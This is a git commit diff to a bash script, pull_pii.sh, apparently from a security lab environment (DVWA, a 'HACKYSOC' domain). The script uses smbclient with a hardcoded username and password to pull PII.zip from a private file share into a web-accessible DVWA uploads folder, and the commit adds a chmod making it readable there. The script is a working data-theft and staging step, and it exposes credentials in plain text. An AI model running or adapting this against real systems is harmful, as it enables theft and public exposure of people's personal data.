e26c50e849f787cac321ed78fc74acaa2fb47744
rnewt6926 <rnewt6926@gmail.com>
2022-09-23 20:32:46 -0500

    chmod

--- pull_pii.sh
+++ pull_pii.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/www/html/dvwa/hackable/uploads; get PII.zip' -W HACKYSOC -U wier%frantic-Folly3 
+chmod 775 PII.zip
 echo 'Finished'
